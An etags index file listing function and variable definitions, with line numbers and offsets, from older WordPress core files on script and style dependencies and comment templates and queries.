	function add( $handle, $src, $deps = array(), $ver = false, $args = null ) {add127,3719
	function add( $handle, $src, $deps = array(), $ver = false, $args = null ) {deps127,3719
	function add_data( $handle, $key, $value ) {add_data144,4165
	function get_data( $handle, $key ) {get_data162,4528
	function remove( $handles ) {remove172,4761
	function enqueue( $handles ) {enqueue177,4876
			$handle = explode('?', $handle);handle179,4952
	function dequeue( $handles ) {dequeue188,5194
			$handle = explode('?', $handle);handle190,5270
			$key = array_search($handle[0], $this->queue);key191,5306
	function query( $handle, $list = 'registered' ) { // registered, queue, done, to_doquery199,5463
	function query( $handle, $list = 'registered' ) { // registered, queue, done, to_dolist199,5463
				$list = 'to_do';list209,5813
				$list = 'printed';list211,5842
	function set_group( $handle, $recursion, $group ) {set_group220,5978
		$group = (int) $group;group221,6031
			$group = min($this->group, $group);group224,6077
			$this->group = $group;group226,6123
class _WP_Dependency {_WP_Dependency237,6300
	var $handle;handle238,6323
	var $src;src239,6337
	var $deps = array();deps240,6348
	var $deps = array();deps240,6348
	var $ver = false;ver241,6370
	var $ver = false;ver241,6370
	var $args = null;args242,6389
	var $args = null;args242,6389
	var $extra = array();extra244,6409
	var $extra = array();extra244,6409
	function __construct() {__construct246,6433
			$this->deps = array();deps249,6583
	function add_data( $name, $data ) {add_data252,6613

wordpress/wp-includes/class.wp-scripts.php,3726
class WP_Scripts extends WP_Dependencies {WP_Scripts19,295
	var $base_url; // Full URL with trailing slashbase_url20,338
	var $content_url;content_url21,386
	var $default_version;default_version22,405
	var $in_footer = array();in_footer23,428
	var $in_footer = array();in_footer23,428
	var $concat = '';concat24,455
	var $concat = '';concat24,455
	var $concat_version = '';concat_version25,474
	var $concat_version = '';concat_version25,474
	var $do_concat = false;do_concat26,501
	var $do_concat = false;do_concat26,501
	var $print_html = '';print_html27,526
	var $print_html = '';print_html27,526
	var $print_code = '';print_code28,549
	var $print_code = '';print_code28,549
	var $ext_handles = '';ext_handles29,572
	var $ext_handles = '';ext_handles29,572
	var $ext_version = '';ext_version30,596
	var $ext_version = '';ext_version30,596
	var $default_dirs;default_dirs31,620
	function __construct() {__construct33,641
	function init() {init38,739
	function print_scripts( $handles = false, $group = false ) {print_scripts51,1249
	function print_scripts( $handles = false, $group = false ) {handles51,1249
	function print_scripts_l10n( $handle, $echo = true ) {print_scripts_l10n56,1412
	function print_scripts_l10n( $handle, $echo = true ) {echo56,1412
	function print_extra_script( $handle, $echo = true ) {print_extra_script61,1597
	function print_extra_script( $handle, $echo = true ) {echo61,1597
	function do_item( $handle, $group = false ) {do_item77,1973
	function do_item( $handle, $group = false ) {group77,1973
			$this->in_footer = array_diff( $this->in_footer, (array) $handle );in_footer87,2253
			$ver = '';ver90,2375
			$ver = $this->registered[$handle]->ver ? $this->registered[$handle]->ver : $this->default_version;ver92,2396
			$ver = $ver ? $ver . '&amp;' . $this->args[$handle] : $this->args[$handle];ver95,2536
		$src = $this->registered[$handle]->src;src97,2616
			$srce = apply_filters( 'script_loader_src', $src, $handle );srce100,2687
			$src = $this->base_url . $src;src114,3212
			$src = add_query_arg('ver', $ver, $src);src118,3273
		$src = esc_url( apply_filters( 'script_loader_src', $src, $handle ) );src120,3318
	function localize( $handle, $object_name, $l10n ) {localize135,3684
			$after = $l10n['l10n_print_after'];after137,3867
		foreach ( (array) $l10n as $key => $value ) {key141,3948
		$script = "var $object_name = " . json_encode($l10n) . ';';script148,4121
		$data = $this->get_data( $handle, 'data' );data153,4236
			$script = "$data\n$script";script156,4308
	function set_group( $handle, $recursion, $group = false ) {set_group161,4398
	function set_group( $handle, $recursion, $group = false ) {group161,4398
			$grp = 1;grp164,4508
			$grp = (int) $this->get_data( $handle, 'group' );grp166,4528
			$grp = $group;grp169,4625
	function all_deps( $handles, $recursion = false, $group = false ) {all_deps174,4705
	function all_deps( $handles, $recursion = false, $group = false ) {recursion174,4705
		$r = parent::all_deps( $handles, $recursion );r175,4774
			$this->to_do = apply_filters( 'print_scripts_array', $this->to_do );to_do177,4844
	function do_head_items() {do_head_items181,4933
	function do_footer_items() {do_footer_items186,5016
	function in_default_dir($src) {in_default_dir191,5101
	function reset() {reset205,5384
		$this->do_concat = false;do_concat206,5404
		$this->print_code = '';print_code207,5432
		$this->concat = '';concat208,5458
		$this->concat_version = '';concat_version209,5480
		$this->print_html = '';print_html210,5510
		$this->ext_version = '';ext_version211,5536
		$this->ext_handles = '';ext_handles212,5563

wordpress/wp-includes/class.wp-styles.php,3274
class WP_Styles extends WP_Dependencies {WP_Styles19,293
	var $base_url;base_url20,335
	var $content_url;content_url21,351
	var $default_version;default_version22,370
	var $text_direction = 'ltr';text_direction23,393
	var $text_direction = 'ltr';text_direction23,393
	var $concat = '';concat24,423
	var $concat = '';concat24,423
	var $concat_version = '';concat_version25,442
	var $concat_version = '';concat_version25,442
	var $do_concat = false;do_concat26,469
	var $do_concat = false;do_concat26,469
	var $print_html = '';print_html27,494
	var $print_html = '';print_html27,494
	var $print_code = '';print_code28,517
	var $print_code = '';print_code28,517
	var $default_dirs;default_dirs29,540
	function __construct() {__construct31,561
	function do_item( $handle ) {do_item35,652
		$obj = $this->registered[$handle];obj39,736
			$ver = '';ver41,801
			$ver = $obj->ver ? $obj->ver : $this->default_version;ver43,822
			$ver = $ver ? $ver . '&amp;' . $this->args[$handle] : $this->args[$handle];ver46,918
			$media = esc_attr( $obj->args );media60,1334
			$media = 'all';media62,1377
		$href = $this->_css_href( $obj->src, $ver, $handle );href64,1397
		$rel = isset($obj->extra['alt']) && $obj->extra['alt'] ? 'alternate stylesheet' : 'stylesheet';rel65,1453
		$title = isset($obj->extra['title']) ? "title='" . esc_attr( $obj->extra['title'] ) . "'" : '';title66,1551
		$end_cond = $tag = '';end_cond68,1650
			$end_cond = "<![endif]-->\n";end_cond71,1805
				$suffix = isset( $obj->extra['suffix'] ) ? $obj->extra['suffix'] : '';suffix77,2128
				$rtl_href = str_replace( "{$suffix}.css", "-rtl{$suffix}.css", $this->_css_href( $obj->src , $ver, "$handle-rtl" ));rtl_href78,2203
				$rtl_href = $this->_css_href( $obj->extra['rtl'], $ver, "$handle-rtl" );rtl_href80,2336
	function add_inline_style( $handle, $code ) {add_inline_style99,2821
		$after = $this->get_data( $handle, 'after' );after103,2902
			$after = array();after105,2967
	function print_inline_style( $handle, $echo = true ) {print_inline_style112,3068
	function print_inline_style( $handle, $echo = true ) {echo112,3068
		$output = $this->get_data( $handle, 'after' );output113,3124
		$output = implode( "\n", $output );output118,3218
	function all_deps( $handles, $recursion = false, $group = false ) {all_deps130,3390
	function all_deps( $handles, $recursion = false, $group = false ) {recursion130,3390
		$r = parent::all_deps( $handles, $recursion );r131,3459
			$this->to_do = apply_filters( 'print_styles_array', $this->to_do );to_do133,3529
	function _css_href( $src, $ver, $handle ) {_css_href137,3617
			$src = $this->base_url . $src;src139,3795
			$src = add_query_arg('ver', $ver, $src);src143,3856
		$src = apply_filters( 'style_loader_src', $src, $handle );src144,3900
	function in_default_dir($src) {in_default_dir148,3991
	function do_footer_items() { // HTML 5 allows styles in the body, grab late enqueued items and output them in the footer.do_footer_items159,4202
	function reset() {reset164,4380
		$this->do_concat = false;do_concat165,4400
		$this->concat = '';concat166,4428
		$this->concat_version = '';concat_version167,4450
		$this->print_html = '';print_html168,4480

wordpress/wp-includes/comment-template.php,22494
function get_comment_author( $comment_ID = 0 ) {get_comment_author23,544
function get_comment_author( $comment_ID = 0 ) {comment_ID23,544
	$comment = get_comment( $comment_ID );comment24,593
			$user=get_userdata($comment->user_id);user27,709
			$author=$user->user_login;author28,751
			$author = __('Anonymous');author30,792
		$author = $comment->comment_author;author33,836
function comment_author( $comment_ID = 0 ) {comment_author46,1183
function comment_author( $comment_ID = 0 ) {comment_ID46,1183
	$author = apply_filters('comment_author', get_comment_author( $comment_ID ) );author47,1228
function get_comment_author_email( $comment_ID = 0 ) {get_comment_author_email61,1677
function get_comment_author_email( $comment_ID = 0 ) {comment_ID61,1677
	$comment = get_comment( $comment_ID );comment62,1732
function comment_author_email( $comment_ID = 0 ) {comment_author_email80,2486
function comment_author_email( $comment_ID = 0 ) {comment_ID80,2486
function comment_author_email_link($linktext='', $before='', $after='') {comment_author_email_link102,3545
function comment_author_email_link($linktext='', $before='', $after='') {before102,3545
	if ( $link = get_comment_author_email_link( $linktext, $before, $after ) )link103,3619
function get_comment_author_email_link($linktext='', $before='', $after='') {get_comment_author_email_link124,4571
function get_comment_author_email_link($linktext='', $before='', $after='') {before124,4571
	$email = apply_filters('comment_email', $comment->comment_author_email);email126,4667
	$display = ($linktext != '') ? $linktext : $email;display128,4785
		$return  = $before;return129,4837
function get_comment_author_link( $comment_ID = 0 ) {get_comment_author_link147,5346
function get_comment_author_link( $comment_ID = 0 ) {comment_ID147,5346
	$url    = get_comment_author_url( $comment_ID );url149,5491
	$author = get_comment_author( $comment_ID );author150,5541
		$return = $author;return153,5631
		$return = "<a href='$url' rel='external nofollow' class='url'>$author</a>";return155,5658
function comment_author_link( $comment_ID = 0 ) {comment_author_link167,6045
function comment_author_link( $comment_ID = 0 ) {comment_ID167,6045
function get_comment_author_IP( $comment_ID = 0 ) {get_comment_author_IP181,6433
function get_comment_author_IP( $comment_ID = 0 ) {comment_ID181,6433
	$comment = get_comment( $comment_ID );comment182,6485
function comment_author_IP( $comment_ID = 0 ) {comment_author_IP194,6846
function comment_author_IP( $comment_ID = 0 ) {comment_ID194,6846
function get_comment_author_url( $comment_ID = 0 ) {get_comment_author_url207,7229
function get_comment_author_url( $comment_ID = 0 ) {comment_ID207,7229
	$comment = get_comment( $comment_ID );comment208,7282
	$url = ('http://' == $comment->comment_author_url) ? '' : $comment->comment_author_url;url209,7322
	$url = esc_url( $url, array('http', 'https') );url210,7411
function comment_author_url( $comment_ID = 0 ) {comment_author_url223,7793
function comment_author_url( $comment_ID = 0 ) {comment_ID223,7793
function get_comment_author_url_link( $linktext = '', $before = '', $after = '' ) {get_comment_author_url_link245,8761
function get_comment_author_url_link( $linktext = '', $before = '', $after = '' ) {linktext245,8761
	$url = get_comment_author_url();url246,8845
	$display = ($linktext != '') ? $linktext : $url;display247,8879
	$display = str_replace( 'http://www.', '', $display );display248,8929
	$display = str_replace( 'http://', '', $display );display249,8985
		$display = substr($display, 0, -1);display251,9073
	$return = "$before<a href='$url' rel='external'>$display</a>$after";return252,9111
function comment_author_url_link( $linktext = '', $before = '', $after = '' ) {comment_author_url_link266,9646
function comment_author_url_link( $linktext = '', $before = '', $after = '' ) {linktext266,9646
 * @param string|array $class One or more classes to add to the class listlist275,9875
function comment_class( $class = '', $comment_id = null, $post_id = null, $echo = true ) {comment_class280,10111
function comment_class( $class = '', $comment_id = null, $post_id = null, $echo = true ) {class280,10111
	$class = 'class="' . join( ' ', get_comment_class( $class, $comment_id, $post_id ) ) . '"';class282,10278
 * @param string|array $class One or more classes to add to the class listlist294,10506
function get_comment_class( $class = '', $comment_id = null, $post_id = null ) {get_comment_class299,10711
function get_comment_class( $class = '', $comment_id = null, $post_id = null ) {class299,10711
	$comment = get_comment($comment_id);comment302,10852
	$classes = array();classes304,10891
	if ( $comment->user_id > 0 && $user = get_userdata($comment->user_id) ) {user310,11126
		if ( $post = get_post($post_id) ) {post315,11419
		$comment_alt = 0;comment_alt322,11577
		$comment_depth = 1;comment_depth324,11627
		$comment_thread_alt = 0;comment_thread_alt326,11684
			$class = preg_split('#\s+#', $class);class352,12162
		$classes = array_merge($classes, $class);classes353,12203
	$classes = array_map('esc_attr', $classes);classes356,12251
function get_comment_date( $d = '', $comment_ID = 0 ) {get_comment_date372,12788
function get_comment_date( $d = '', $comment_ID = 0 ) {d372,12788
	$comment = get_comment( $comment_ID );comment373,12844
		$date = mysql2date(get_option('date_format'), $comment->comment_date);date375,12901
		$date = mysql2date($d, $comment->comment_date);date377,12980
function comment_date( $d = '', $comment_ID = 0 ) {comment_date389,13326
function comment_date( $d = '', $comment_ID = 0 ) {d389,13326
function get_comment_excerpt( $comment_ID = 0 ) {get_comment_excerpt407,13927
function get_comment_excerpt( $comment_ID = 0 ) {comment_ID407,13927
	$comment = get_comment( $comment_ID );comment408,13977
	$comment_text = strip_tags($comment->comment_content);comment_text409,14017
	$blah = explode(' ', $comment_text);blah410,14073
		$k = 20;k412,14137
		$use_dotdotdot = 1;use_dotdotdot413,14148
		$k = count($blah);k415,14180
		$use_dotdotdot = 0;use_dotdotdot416,14201
	$excerpt = '';excerpt418,14226
function comment_excerpt( $comment_ID = 0 ) {comment_excerpt434,14653
function comment_excerpt( $comment_ID = 0 ) {comment_ID434,14653
function get_comment_ID() {get_comment_ID447,14982
function comment_ID() {comment_ID458,15210
function get_comment_link( $comment = null, $args = array() ) {get_comment_link472,15499
function get_comment_link( $comment = null, $args = array() ) {comment472,15499
	$comment = get_comment($comment);comment475,15603
		$page = $args;page479,15687
		$args = array();args480,15704
	$defaults = array( 'type' => 'all', 'page' => '', 'per_page' => '', 'max_depth' => '' );defaults484,15752
	$args = wp_parse_args( $args, $defaults );args485,15842
			$link = user_trailingslashit( trailingslashit( get_permalink( $comment->comment_post_ID ) ) . 'comment-page-' . $args['page'], 'comment' );link500,16318
			$link = add_query_arg( 'cpage', $args['page'], get_permalink( $comment->comment_post_ID ) );link502,16468
		$link = get_permalink( $comment->comment_post_ID );link504,16574
function get_comments_link($post_id = 0) {get_comments_link518,16906
function comments_link( $deprecated = '', $deprecated_2 = '' ) {comments_link530,17155
function comments_link( $deprecated = '', $deprecated_2 = '' ) {deprecated530,17155
function get_comments_number( $post_id = 0 ) {get_comments_number547,17656
function get_comments_number( $post_id = 0 ) {post_id547,17656
	$post_id = absint( $post_id );post_id548,17703
		$post_id = get_the_ID();post_id551,17754
	$post = get_post($post_id);post553,17782
		$count = 0;count555,17849
		$count = $post->comment_count;count557,17869
function comments_number( $zero = false, $one = false, $more = false, $deprecated = '' ) {comments_number573,18368
function comments_number( $zero = false, $one = false, $more = false, $deprecated = '' ) {zero573,18368
	$number = get_comments_number();number577,18537
		$output = str_replace('%', number_format_i18n($number), ( false === $more ) ? __('% Comments') : $more);output580,18592
	elseif ( $number == 0 )number581,18699
		$output = ( false === $zero ) ? __('No Comments') : $zero;output582,18724
		$output = ( false === $one ) ? __('1 Comment') : $one;output584,18806
function get_comment_text( $comment_ID = 0 ) {get_comment_text598,19141
function get_comment_text( $comment_ID = 0 ) {comment_ID598,19141
	$comment = get_comment( $comment_ID );comment599,19188
function comment_text( $comment_ID = 0 ) {comment_text612,19626
function comment_text( $comment_ID = 0 ) {comment_ID612,19626
	$comment = get_comment( $comment_ID );comment613,19669
function get_comment_time( $d = '', $gmt = false, $translate = true ) {get_comment_time629,20260
function get_comment_time( $d = '', $gmt = false, $translate = true ) {d629,20260
	$comment_date = $gmt ? $comment->comment_date_gmt : $comment->comment_date;comment_date631,20350
		$date = mysql2date(get_option('time_format'), $comment_date, $translate);date633,20444
		$date = mysql2date($d, $comment_date, $translate);date635,20526
function comment_time( $d = '' ) {comment_time646,20816
function comment_time( $d = '' ) {d646,20816
function get_comment_type( $comment_ID = 0 ) {get_comment_type660,21182
function get_comment_type( $comment_ID = 0 ) {comment_ID660,21182
	$comment = get_comment( $comment_ID );comment661,21229
function comment_type($commenttxt = false, $trackbacktxt = false, $pingbacktxt = false) {comment_type677,21706
function comment_type($commenttxt = false, $trackbacktxt = false, $pingbacktxt = false) {trackbacktxt677,21706
	if ( false === $commenttxt ) $commenttxt = _x( 'Comment', 'noun' );commenttxt678,21796
	if ( false === $trackbacktxt ) $trackbacktxt = __( 'Trackback' );trackbacktxt679,21865
	if ( false === $pingbacktxt ) $pingbacktxt = __( 'Pingback' );pingbacktxt680,21932
	$type = get_comment_type();type681,21996
function get_trackback_url() {get_trackback_url706,22620
		$tb_url = trailingslashit(get_permalink()) . user_trailingslashit('trackback', 'single_trackback');tb_url708,22701
		$tb_url = get_option('siteurl') . '/wp-trackback.php?p=' . get_the_ID();tb_url710,22813
function trackback_url( $deprecated_echo = true ) {trackback_url724,23272
function trackback_url( $deprecated_echo = true ) {deprecated_echo724,23272
 * @param int $deprecated Not used (Was $timezone = 0)timezone740,23742
function trackback_rdf( $deprecated = '' ) {trackback_rdf742,23801
function trackback_rdf( $deprecated = '' ) {deprecated742,23801
function comments_open( $post_id = null ) {comments_open772,24748
function comments_open( $post_id = null ) {post_id772,24748
	$_post = get_post($post_id);_post774,24793
	$open = ( 'open' == $_post->comment_status );open776,24824
function pings_open( $post_id = null ) {pings_open789,25149
function pings_open( $post_id = null ) {post_id789,25149
	$_post = get_post($post_id);_post791,25191
	$open = ( 'open' == $_post->ping_status );open793,25222
 * The function was backported to 2.0.10 and was added to versions 2.1.3 andwas803,25517
function wp_comment_form_unfiltered_html_nonce() {wp_comment_form_unfiltered_html_nonce812,25847
	$post_id = 0;post_id815,25914
		$post_id = $post->ID;post_id817,25951
function comments_template( $file = '/comments.php', $separate_comments = false ) {comments_template851,27520
function comments_template( $file = '/comments.php', $separate_comments = false ) {file851,27520
		$file = '/comments.php';file858,27827
	$req = get_option('require_name_email');req860,27855
	$commenter = wp_get_current_commenter();commenter867,28014
	$comment_author = $commenter['comment_author']; // Escaped by sanitize_comment_cookies()comment_author872,28141
	$comment_author_email = $commenter['comment_author_email'];  // Escaped by sanitize_comment_cookies()comment_author_email877,28325
	$comment_author_url = esc_url($commenter['comment_author_url']);comment_author_url882,28512
		$comments = $wpdb->get_results($wpdb->prepare("SELECT * FROM $wpdb->comments WHERE comment_post_ID = %d AND (comment_approved = '1' OR ( user_id = %d AND comment_approved = '0' ) )  ORDER BY comment_date_gmt", $post->ID, $user_ID));comments886,28639
		$comments = get_comments( array('post_id' => $post->ID, 'status' => 'approve', 'order' => 'ASC') );comments888,28914
		$comments = $wpdb->get_results($wpdb->prepare("SELECT * FROM $wpdb->comments WHERE comment_post_ID = %d AND ( comment_approved = '1' OR ( comment_author = %s AND comment_author_email = %s AND comment_approved = '0' ) ) ORDER BY comment_date_gmt", $post->ID, wp_specialchars_decode($comment_author,ENT_QUOTES), $comment_author_email));comments890,29026
	$comments = &$wp_query->comments;comments895,29484
		$comments_by_type = &$wp_query->comments_by_type;comments_by_type901,29712
	$overridden_cpage = false;overridden_cpage904,29768
		$overridden_cpage = true;overridden_cpage907,29975
		define('COMMENTS_TEMPLATE', true);COMMENTS_TEMPLATE911,30066
	$include = apply_filters('comments_template', STYLESHEETPATH . $file );include913,30104
 * For the comment link popup to work, this function has to be called or thehas928,30623
 * @global int $wpcommentsjavascript Whether to use JavaScript. Set when function is calledis933,30833
function comments_popup_script($width=400, $height=400, $file='') {comments_popup_script939,31127
function comments_popup_script($width=400, $height=400, $file='') {height939,31127
		$wpcommentspopupfile = '';  // Use the index.wpcommentspopupfile943,31271
		$wpcommentspopupfile = $file;wpcommentspopupfile945,31329
	$wpcommentsjavascript = 1;wpcommentsjavascript948,31365
	$javascript = "<script type='text/javascript'>\nfunction wpopen (macagna) {\n    window.open(macagna, '_blank', 'width=$width,height=$height,scrollbars=yes,status=yes');\n}\n</script>\n";javascript949,31393
 * @param string $css_class The CSS class to use for commentsto967,32105
function comments_popup_link( $zero = false, $one = false, $more = false, $css_class = '', $none = false ) {comments_popup_link971,32307
function comments_popup_link( $zero = false, $one = false, $more = false, $css_class = '', $none = false ) {zero971,32307
	$id = get_the_ID();id974,32470
	if ( false === $zero ) $zero = __( 'No Comments' );zero976,32492
	if ( false === $one ) $one = __( '1 Comment' );one977,32545
	if ( false === $more ) $more = __( '% Comments' );more978,32594
	if ( false === $none ) $none = __( 'Comments Off' );none979,32646
	$number = get_comments_number( $id );number981,32701
			$home = home_url();home996,33122
			$home = get_option('siteurl');home998,33152
	$title = the_title_attribute( array('echo' => 0 ) );title1012,33574
function get_comment_reply_link($args = array(), $comment = null, $post = null) {get_comment_reply_link1038,34616
function get_comment_reply_link($args = array(), $comment = null, $post = null) {comment1038,34616
	$defaults = array('add_below' => 'comment', 'respond_id' => 'respond', 'reply_text' => __('Reply'),defaults1041,34717
	$args = wp_parse_args($args, $defaults);args1044,34906
	$comment = get_comment($comment);comment1051,35057
		$post = $comment->comment_post_ID;post1053,35113
	$post = get_post($post);post1054,35150
	$link = '';link1059,35228
		$link = '<a rel="nofollow" class="comment-reply-login" href="' . esc_url( wp_login_url( get_permalink() ) ) . '">' . $login_text . '</a>';link1062,35298
		$link = "<a class='comment-reply-link' href='" . esc_url( add_query_arg( 'replytocom', $comment->comment_ID ) ) . "#" . $respond_id . "' onclick='return addComment.moveForm(\"$add_below-$comment->comment_ID\", \"$comment->comment_ID\", \"$respond_id\", \"$post->ID\")'>$reply_text</a>";link1064,35445
function comment_reply_link($args = array(), $comment = null, $post = null) {comment_reply_link1079,36264
function comment_reply_link($args = array(), $comment = null, $post = null) {comment1079,36264
function get_post_reply_link($args = array(), $post = null) {get_post_reply_link1099,37160
function get_post_reply_link($args = array(), $post = null) {post1099,37160
	$defaults = array('add_below' => 'post', 'respond_id' => 'respond', 'reply_text' => __('Leave a Comment'),defaults1102,37241
	$args = wp_parse_args($args, $defaults);args1105,37433
	$post = get_post($post);post1107,37503
		$link = '<a rel="nofollow" href="' . wp_login_url( get_permalink() ) . '">' . $login_text . '</a>';link1113,37639
		$link = "<a rel='nofollow' class='comment-reply-link' href='" . get_permalink($post->ID) . "#$respond_id' onclick='return addComment.moveForm(\"$add_below-$post->ID\", \"0\", \"$respond_id\", \"$post->ID\")'>$reply_text</a>";link1115,37751
function post_reply_link($args = array(), $post = null) {post_reply_link1129,38420
function post_reply_link($args = array(), $post = null) {post1129,38420
function get_cancel_comment_reply_link($text = '') {get_cancel_comment_reply_link1140,38680
		$text = __('Click here to cancel reply.');text1142,38754
	$style = isset($_GET['replytocom']) ? '' : ' style="display:none;"';style1144,38800
	$link = esc_html( remove_query_arg('replytocom') ) . '#respond';link1145,38870
function cancel_comment_reply_link($text = '') {cancel_comment_reply_link1156,39267
function get_comment_id_fields( $id = 0 ) {get_comment_id_fields1167,39510
function get_comment_id_fields( $id = 0 ) {id1167,39510
		$id = get_the_ID();id1169,39575
	$replytoid = isset($_GET['replytocom']) ? (int) $_GET['replytocom'] : 0;replytoid1171,39598
	$result  = "<input type='hidden' name='comment_post_ID' value='$id' id='comment_post_ID' />\n";result1172,39672
function comment_id_fields( $id = 0 ) {comment_id_fields1183,40071
function comment_id_fields( $id = 0 ) {id1183,40071
function comment_form_title( $noreplytext = false, $replytext = false, $linktoparent = true ) {comment_form_title1196,40613
function comment_form_title( $noreplytext = false, $replytext = false, $linktoparent = true ) {noreplytext1196,40613
	if ( false === $noreplytext ) $noreplytext = __( 'Leave a Reply' );noreplytext1199,40728
	if ( false === $replytext ) $replytext = __( 'Leave a Reply to %s' );replytext1200,40797
	$replytoid = isset($_GET['replytocom']) ? (int) $_GET['replytocom'] : 0;replytoid1202,40869
		$comment = get_comment($replytoid);comment1207,40997
		$author = ( $linktoparent ) ? '<a href="#comment-' . get_comment_ID() . '">' . get_comment_author() . '</a>' : get_comment_author();author1208,41035
class Walker_Comment extends Walker {Walker_Comment1220,41302
	var $tree_type = 'comment';tree_type1226,41411
	var $tree_type = 'comment';tree_type1226,41411
	var $db_fields = array ('parent' => 'comment_parent', 'id' => 'comment_ID');db_fields1233,41511
	var $db_fields = array ('parent' => 'comment_parent', 'id' => 'comment_ID');db_fields1233,41511
	function start_lvl( &$output, $depth = 0, $args = array() ) {start_lvl1243,41840
	function start_lvl( &$output, $depth = 0, $args = array() ) {depth1243,41840
	function end_lvl( &$output, $depth = 0, $args = array() ) {end_lvl1267,42413
	function end_lvl( &$output, $depth = 0, $args = array() ) {depth1267,42413
	 * This function is designed to enhance Walker::display_element() tois1284,42688
	function display_element( $element, &$children_elements, $max_depth, $depth=0, $args, &$output ) {display_element1301,43114
	function display_element( $element, &$children_elements, $max_depth, $depth=0, $args, &$output ) {depth1301,43114
		$id_field = $this->db_fields['id'];id_field1306,43246
		$id = $element->$id_field;id1307,43284
	function start_el( &$output, $comment, $depth, $args, $id = 0 ) {start_el1331,44142
	function start_el( &$output, $comment, $depth, $args, $id = 0 ) {id1331,44142
			$tag = 'div';tag1344,44475
			$add_below = 'comment';add_below1345,44492
			$tag = 'li';tag1347,44530
			$add_below = 'div-comment';add_below1348,44546
	function end_el(&$output, $comment, $depth = 0, $args = array() ) {end_el1391,46107
	function end_el(&$output, $comment, $depth = 0, $args = array() ) {depth1391,46107
function wp_list_comments($args = array(), $comments = null ) {wp_list_comments1415,46676
function wp_list_comments($args = array(), $comments = null ) {comments1415,46676
	$in_comment_loop = true;in_comment_loop1418,46848
	$comment_alt = $comment_thread_alt = 0;comment_alt1420,46875
	$comment_depth = 1;comment_depth1421,46916
	$defaults = array('walker' => null, 'max_depth' => '', 'style' => 'ul', 'callback' => null, 'end-callback' => null, 'type' => 'all',defaults1423,46938
	$r = wp_parse_args( $args, $defaults );r1426,47184
		$comments = (array) $comments;comments1430,47322
			$comments_by_type = &separate_comments($comments);comments_by_type1434,47423
			$_comments = $comments_by_type[$r['type']];_comments1437,47536
			$_comments = $comments;_comments1439,47594
			$_comments = $wp_query->comments_by_type[$r['type']];_comments1449,47902
			$_comments = $wp_query->comments;_comments1451,47970
			$threaded = ( -1 != $r['max_depth'] );threaded1474,48489
		$walker = new Walker_Comment;walker1490,49002
	$in_comment_loop = false;in_comment_loop1495,49160
function comment_form( $args = array(), $post_id = null ) {comment_form1512,49886
function comment_form( $args = array(), $post_id = null ) {args1512,49886
		$post_id = $id;post_id1516,49986
		$id = $post_id;id1518,50010
	$commenter = wp_get_current_commenter();commenter1520,50029
	$user = wp_get_current_user();user1521,50071
	$user_identity = $user->exists() ? $user->display_name : '';user_identity1522,50103
	$req = get_option( 'require_name_email' );req1524,50166
	$aria_req = ( $req ? " aria-required='true'" : '' );aria_req1525,50210
	$fields =  array(fields1526,50264
	$required_text = sprintf( ' ' . __('Required fields are marked %s'), '<span class="required">*</span>' );required_text1535,51134
	$defaults = array(defaults1536,51241
	$args = wp_parse_args( $args, apply_filters( 'comment_form_defaults', $defaults ) );args1551,52759
							foreach ( (array) $args['fields'] as $name => $field ) {name1571,53928

wordpress/wp-includes/comment.php,24762
function check_comment($author, $email, $url, $comment, $user_ip, $user_agent, $comment_type) {check_comment41,1415
	$comment = apply_filters( 'comment_text', $comment );comment47,1624
	if ( $max_links = get_option( 'comment_max_links' ) ) {max_links50,1710
		$num_links = preg_match_all( '/<a [^>]*href/i', $comment, $out );num_links51,1767
		$num_links = apply_filters( 'comment_max_links_url', $num_links, $url ); // provide for counting of $url as a linknum_links52,1835
	$mod_keys = trim(get_option('moderation_keys'));mod_keys57,2007
		$words = explode("\n", $mod_keys );words59,2085
			$word = trim($word);word62,2163
			$word = preg_quote($word, '#');word70,2340
			$pattern = "#$word#i";pattern72,2376
			$ok_to_comment = $wpdb->get_var("SELECT comment_approved FROM $wpdb->comments WHERE comment_author = '$author' AND comment_author_email = '$email' and comment_approved = '1' LIMIT 1");ok_to_comment86,2953
function get_approved_comments($post_id) {get_approved_comments108,3528
function &get_comment(&$comment, $output = OBJECT) {get_comment130,4357
function &get_comment(&$comment, $output = OBJECT) {output130,4357
	$null = null;null132,4425
			$_comment = & $GLOBALS['comment'];_comment136,4503
			$_comment = null;_comment138,4548
		$_comment = $comment;_comment141,4664
			$_comment = & $GLOBALS['comment'];_comment144,4785
		} elseif ( ! $_comment = wp_cache_get($comment, 'comment') ) {_comment145,4823
			$_comment = $wpdb->get_row($wpdb->prepare("SELECT * FROM $wpdb->comments WHERE comment_ID = %d LIMIT 1", $comment));_comment146,4888
	$_comment = apply_filters('get_comment', $_comment);_comment153,5118
	if ( $output == OBJECT ) {output155,5173
	} elseif ( $output == ARRAY_A ) {output157,5221
		$__comment = get_object_vars($_comment);__comment158,5256
	} elseif ( $output == ARRAY_N ) {output160,5320
		$__comment = array_values(get_object_vars($_comment));__comment161,5355
function get_comments( $args = '' ) {get_comments182,5871
function get_comments( $args = '' ) {args182,5871
	$query = new WP_Comment_Query;query183,5909
class WP_Comment_Query {WP_Comment_Query192,6037
	function query( $query_vars ) {query202,6178
		$defaults = array(defaults205,6228
		$this->query_vars = wp_parse_args( $query_vars, $defaults );query_vars228,6662
		$key = md5( serialize( compact(array_keys($defaults)) )  );key233,6916
		$last_changed = wp_cache_get('last_changed', 'comment');last_changed234,6978
			$last_changed = time();last_changed236,7063
		$cache_key = "get_comments:$key:$last_changed";cache_key239,7153
		if ( $cache = wp_cache_get( $cache_key, 'comment' ) ) {cache241,7204
		$post_id = absint($post_id);post_id245,7285
			$approved = "comment_approved = '0'";approved248,7344
			$approved = "comment_approved = '1'";approved250,7419
			$approved = "comment_approved = 'spam'";approved252,7491
			$approved = "comment_approved = 'trash'";approved254,7567
			$approved = "( comment_approved = '0' OR comment_approved = '1' )";approved256,7619
		$order = ( 'ASC' == strtoupper($order) ) ? 'ASC' : 'DESC';order258,7691
			$ordersby = is_array($orderby) ? $orderby : preg_split('/[,\s]/', $orderby);ordersby261,7784
			$ordersby = array_intersect(ordersby262,7864
			$orderby = empty( $ordersby ) ? 'comment_date_gmt' : implode(', ', $ordersby);orderby282,8281
			$orderby = 'comment_date_gmt';orderby284,8374
		$number = absint($number);number287,8413
		$offset = absint($offset);offset288,8442
				$limits = 'LIMIT ' . $offset . ',' . $number;limits292,8517
				$limits = 'LIMIT ' . $number;limits294,8575
			$limits = '';limits296,8620
			$fields = 'COUNT(*)';fields300,8658
			$fields = '*';fields302,8690
		$join = '';join304,8709
		$where = $approved;where305,8723
		$post_fields = array_filter( compact( array( 'post_author', 'post_name', 'post_parent', 'post_status', 'post_type', ) ) );post_fields327,9673
